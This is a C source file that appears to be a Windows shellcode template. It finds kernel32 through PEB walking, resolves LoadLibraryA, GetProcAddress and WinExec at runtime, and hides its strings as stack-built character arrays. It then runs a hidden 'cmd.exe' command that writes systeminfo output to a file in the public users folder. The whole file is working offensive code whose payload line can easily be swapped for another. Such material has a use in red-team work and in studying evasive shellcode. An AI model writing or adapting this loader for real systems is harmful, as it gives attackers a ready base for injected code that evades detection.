#include <windows.h>
#include "peb-lookup.h"

#pragma code_seg(".text")

__declspec(allocate(".text"))
wchar_t kernel32_str[] = {'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0};

__declspec(allocate(".text")) char load_lib_str[] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0};

int main()
{
    // Stack based strings for libraries and functions the shellcode needs
    wchar_t kernel32_dll_name[] = {'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0};
    char load_lib_name[] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0};
    char get_proc_name[] = {'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0};
    // char user32_dll_name[] = { 'u','s','e','r','3','2','.','d','l','l', 0 };
    char winexec_name[] = {'W', 'i', 'n', 'E', 'x', 'e', 'c', 0};
    // resolve kernel32 image base
    LPVOID base = get_module_by_name((const LPWSTR)kernel32_dll_name);
    if (!base)
    {
        return 1;
    }

    // resolve loadlibraryA() address
    LPVOID load_lib = get_func_by_name((HMODULE)base, (LPSTR)load_lib_name);
    if (!load_lib)
    {
        return 2;
    }

    // resolve getprocaddress() address
    LPVOID get_proc = get_func_by_name((HMODULE)base, (LPSTR)get_proc_name);
    if (!get_proc)
    {
        return 3;
    }

    // loadlibrarya and getprocaddress function definitions
    HMODULE(WINAPI * _LoadLibraryA)
    (LPCSTR lpLibFileName) = (HMODULE(WINAPI *)(LPCSTR))load_lib;
    FARPROC(WINAPI * _GetProcAddress)
    (HMODULE hModule, LPCSTR lpProcName) = (FARPROC(WINAPI *)(HMODULE, LPCSTR))get_proc;

    // load user32.dll
    // LPVOID u32_dll = _LoadLibraryA(user32_dll_name);
    char cmd[] = {
        'c', 'm', 'd', '.', 'e', 'x', 'e', ' ', '/', 'c', ' ',
        's', 'y', 's', 't', 'e', 'm', 'i', 'n', 'f', 'o', '.', 'e', 'x', 'e', ' ',
        '>', ' ',
        'C', ':', '\\', 'u', 's', 'e', 'r', 's', '\\', 'p', 'u', 'b', 'l', 'i', 'c', '\\', 't', '.', 't', 'x', 't',
        0};

    UINT(WINAPI * _WinExec)
    (
        _In_ LPCSTR lpCmdLine,
        _In_ UINT uCmdShow) = (UINT(WINAPI *)(_In_ LPCSTR,
                                              _In_ UINT))_GetProcAddress((HMODULE)base, winexec_name);

    if (_WinExec == NULL)
        return 4;

    _WinExec(cmd, 0);

    return 0;
}